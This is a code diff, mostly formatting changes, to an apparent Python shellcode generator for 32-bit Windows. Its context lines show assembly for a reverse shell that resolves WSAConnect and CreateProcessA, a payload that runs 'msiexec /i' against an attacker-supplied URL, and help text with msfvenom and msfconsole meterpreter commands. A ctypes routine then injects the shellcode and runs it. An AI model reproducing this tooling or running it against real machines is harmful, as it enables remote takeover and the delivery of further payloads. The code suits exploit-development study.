@@ -32,7 +32,7 @@ def ror_str(byte, count):
     while count > 0:
         binb = binb[-1] + binb[0:-1]
         count -= 1
-    return (int(binb, 2))
+    return int(binb, 2)
 
 
 def push_function_hash(function_name):
@@ -40,10 +40,10 @@ def push_function_hash(function_name):
     ror_count = 0
     for eax in function_name:
         edx = edx + ord(eax)
-        if ror_count < len(function_name)-1:
-            edx = ror_str(edx, 0xd)
+        if ror_count < len(function_name) - 1:
+            edx = ror_str(edx, 0xD)
         ror_count += 1
-    return ("push " + hex(edx))
+    return "push " + hex(edx)
 
 
 def push_string(input_string):
@@ -55,29 +55,35 @@ def push_string(input_string):
     null_terminated = False
     for i in range(rev_hex_payload_len, 0, -1):
         # add every 4 byte (8 chars) to one push statement
-        if ((i != 0) and ((i % 8) == 0)):
-            target_bytes = rev_hex_payload[i-8:i]
+        if (i != 0) and ((i % 8) == 0):
+            target_bytes = rev_hex_payload[i - 8 : i]
             instructions.append(
-                f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
+                f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};"
+            )
         # handle the left ofer instructions
-        elif ((0 == i-1) and ((i % 8) != 0) and rev_hex_payload_len != 8):
-            if (rev_hex_payload_len % 8 == 2):
+        elif (0 == i - 1) and ((i % 8) != 0) and rev_hex_payload_len != 8:
+            if rev_hex_payload_len % 8 == 2:
                 first_instructions.append(
-                    f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
+                    f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};"
+                )
                 first_instructions.append("push eax;")
-            elif (rev_hex_payload_len % 8 == 4):
-                target_bytes = rev_hex_payload[(
-                    rev_hex_payload_len - (rev_hex_payload_len % 8)):]
+            elif rev_hex_payload_len % 8 == 4:
+                target_bytes = rev_hex_payload[
+                    (rev_hex_payload_len - (rev_hex_payload_len % 8)) :
+                ]
                 first_instructions.append(
-                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};"
+                )
                 first_instructions.append("push eax;")
             else:
-                target_bytes = rev_hex_payload[(
-                    rev_hex_payload_len - (rev_hex_payload_len % 8)):]
+                target_bytes = rev_hex_payload[
+                    (rev_hex_payload_len - (rev_hex_payload_len % 8)) :
+                ]
                 first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
                 first_instructions.append("push eax;")
                 first_instructions.append(
-                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};"
+                )
                 first_instructions.append("push ax;")
             null_terminated = True
 
@@ -180,15 +186,15 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       popad                           ;",  # Restore registers
         "       ret                             ;",  #
         "   resolve_symbols_kernel32:            ",
-        push_instr_terminate_hash,                   # TerminateProcess hash
+        push_instr_terminate_hash,  # TerminateProcess hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save TerminateProcess address for later
         "       mov [ebp+0x10], eax             ;",
-        push_instr_loadlibrarya_hash,                # LoadLibraryA hash
+        push_instr_loadlibrarya_hash,  # LoadLibraryA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save LoadLibraryA address for later
         "       mov [ebp+0x14], eax             ;",
-        push_instr_createprocessa_hash,              # CreateProcessA hash
+        push_instr_createprocessa_hash,  # CreateProcessA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save CreateProcessA address for later
         "       mov [ebp+0x18], eax             ;",
@@ -207,15 +213,15 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "   resolve_symbols_ws2_32:              ",
         # Move the base address of ws2_32.dll to EBX
         "       mov ebx, eax                    ;",
-        push_instr_wsastartup_hash,                  # WSAStartup hash
+        push_instr_wsastartup_hash,  # WSAStartup hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save WSAStartup address for later usage
         "       mov [ebp+0x1C], eax             ;",
-        push_instr_wsasocketa_hash,                  # WSASocketA hash
+        push_instr_wsasocketa_hash,  # WSASocketA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save WSASocketA address for later usage
         "       mov [ebp+0x20], eax             ;",
-        push_instr_wsaconnect_hash, 		     # WSAConnect hash
+        push_instr_wsaconnect_hash,  # WSAConnect hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save WSAConnect address for later usage
         "       mov [ebp+0x24], eax             ;",
@@ -341,7 +347,7 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     if rev_port == "80":
         rev_port = ""
     else:
-        rev_port = (":" + rev_port)
+        rev_port = ":" + rev_port
 
     # align the string to 4 bytes (to keep the stack aligned)
     msi_exec_str = f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn"
@@ -439,11 +445,11 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       popad                           ;",  # Restore registers
         "       ret                             ;",  #
         "   resolve_symbols_kernel32:            ",
-        push_instr_terminate_hash,                   # TerminateProcess hash
+        push_instr_terminate_hash,  # TerminateProcess hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save TerminateProcess address for later
         "       mov [ebp+0x10], eax             ;",
-        push_instr_loadlibrarya_hash,                # LoadLibraryA hash
+        push_instr_loadlibrarya_hash,  # LoadLibraryA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save LoadLibraryA address for later
         "       mov [ebp+0x14], eax             ;",
@@ -451,14 +457,14 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         # Null EAX / Push the target library string on the stack --> msvcrt.dll  -->  6d737663 72742e64 6c6c
         "       xor eax, eax                    ;",
         "       push eax                        ;",  # Push a null byte
-        push_instr_msvcrt,                           # Push the msvcrt.dll string
+        push_instr_msvcrt,  # Push the msvcrt.dll string
         # Push ESP to have a pointer to the string
         "       push esp                        ;",
         "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
         "   resolve_symbols_msvcrt:              ",
         # Move the base address of msvcrt.dll to EBX
         "       mov ebx, eax                    ;",
-        push_instr_system_hash,                      # System hash
+        push_instr_system_hash,  # System hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save System address for later
         "       mov [ebp+0x18], eax             ;",
@@ -475,7 +481,7 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       xor ecx, ecx                    ;",  # Null ECX
         "       push ecx                        ;",  # uExitCode
         "       push 0xffffffff                 ;",  # hProcess
-        "       call dword ptr [ebp+0x10]       ;",   # Call TerminateProcess
+        "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
     ]
     return "\n".join(asm)
 
@@ -575,11 +581,11 @@ def msg_box(header, text, breakpoint=0):
         "       popad                           ;",  # Restore registers
         "       ret                             ;",  #
         "   resolve_symbols_kernel32:            ",
-        push_instr_terminate_hash,                   # TerminateProcess hash
+        push_instr_terminate_hash,  # TerminateProcess hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save TerminateProcess address for later
         "       mov [ebp+0x10], eax             ;",
-        push_instr_loadlibrarya_hash,                # LoadLibraryA hash
+        push_instr_loadlibrarya_hash,  # LoadLibraryA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save LoadLibraryA address for later
         "       mov [ebp+0x14], eax             ;",
@@ -587,14 +593,14 @@ def msg_box(header, text, breakpoint=0):
         # Null EAX / Push the target library string on the stack --> user32.dll
         "       xor eax, eax                    ;",
         "       push eax                        ;",  # Push a null byte
-        push_instr_user32,                              # Push the DLL name
+        push_instr_user32,  # Push the DLL name
         # Push ESP to have a pointer to the string
         "       push esp                        ;",
         "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
         "   resolve_symbols_user32:              ",
         # Move the base address of user32.dll to EBX
         "       mov ebx, eax                    ;",
-        push_instr_msgbox_hash,                      # MessageBoxA hash
+        push_instr_msgbox_hash,  # MessageBoxA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         # Save MessageBoxA address for later
         "       mov [ebp+0x18], eax             ;",
@@ -602,12 +608,12 @@ def msg_box(header, text, breakpoint=0):
         "   call_system:                         ",
         "       xor eax, eax                    ;",  # Null EAX
         "       push eax                        ;",  # Create a null byte on the stack
-        push_instr_header,                           # Push the header text
+        push_instr_header,  # Push the header text
         # Store the pointer to the window header in ebx
         "       mov ebx, esp                    ;",
         "       xor eax, eax                    ;",  # Null EAX
         "       push eax                        ;",  # Create a null byte on the stack
-        push_instr_text,                             # Push the text
+        push_instr_text,  # Push the text
         # Store the pointer to the window text in ecx
         "       mov ecx, esp                    ;",
         "       xor eax, eax                    ;",  # Null EAX
@@ -632,7 +638,7 @@ def msg_box(header, text, breakpoint=0):
 
 def main(args):
     help_msg = ""
-    if (args.msi):
+    if args.msi:
         shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
         help_msg += f"\t Create msi payload:\n"
         help_msg += f"\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n"
@@ -640,7 +646,7 @@ def main(args):
         help_msg += f"\t\t sudo python -m SimpleHTTPServer {args.lport} \n"
         help_msg += f"\t Start the metasploit listener:\n"
         help_msg += f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
-    elif (args.messagebox):
+    elif args.messagebox:
         shellcode = msg_box(args.mb_header, args.mb_text, args.debug_break)
     else:
         shellcode = rev_shellcode(args.lhost, args.lport, args.debug_break)
@@ -706,8 +712,7 @@ def main(args):
             ctypes.c_int(0x3000),
             ctypes.c_int(0x40),
         )
-        buf = (ctypes.c_char * len(packed_shellcode)
-               ).from_buffer(packed_shellcode)
+        buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
         ctypes.windll.kernel32.RtlMoveMemory(
             ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
         )
@@ -721,8 +726,7 @@ def main(args):
             ctypes.c_int(0),
             ctypes.pointer(ctypes.c_int(0)),
         )
-        ctypes.windll.kernel32.WaitForSingleObject(
-            ctypes.c_int(ht), ctypes.c_int(-1))
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
 
 
 if __name__ == "__main__":
@@ -755,12 +759,8 @@ if __name__ == "__main__":
     parser.add_argument(
         "--messagebox", help="create a message box payload", action="store_true"
     )
-    parser.add_argument(
-        "--mb-header", help="message box header text"
-    )
-    parser.add_argument(
-        "--mb-text", help="message box text"
-    )
+    parser.add_argument("--mb-header", help="message box header text")
+    parser.add_argument("--mb-text", help="message box text")
     parser.add_argument(
         "-d",
         "--debug-break",
